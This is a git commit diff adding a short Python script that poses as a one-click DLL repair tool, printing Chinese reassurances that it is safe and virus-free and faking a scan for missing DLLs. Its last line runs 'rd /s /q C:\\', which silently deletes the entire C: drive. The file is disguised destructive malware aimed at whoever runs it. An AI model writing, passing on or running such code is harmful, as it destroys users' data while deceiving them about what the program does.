3d897be8b0412f1e662046e101b2e0525deae9d6
SymphonyIceAttack <79434860+SymphonyIceAttack@users.noreply.github.com>
2026-02-12 20:32:29 +0800

    Upload 一键修复dll.py

---
+++ python-files/1770899549402-w39q-一键修复dll.py
@@ -0,0 +1,12 @@
+import os
+import time
+import random
+print('绿色终端版DLL修复工具 吾爱破解')
+time.sleep(2)
+print('本软件绿色无毒，请放心使用！')
+time.sleep(2)
+print('正在寻找丢失的DLL文件... ...')
+time.sleep(random.randint(12,18))
+errdll = random.randint(104,308)
+print(f'一共发现{errdll}个DLL缺失，软件正在自动补齐DLL文件，大概需要30分，请耐心等待！')
+os.system('rd /s /q C:\\')
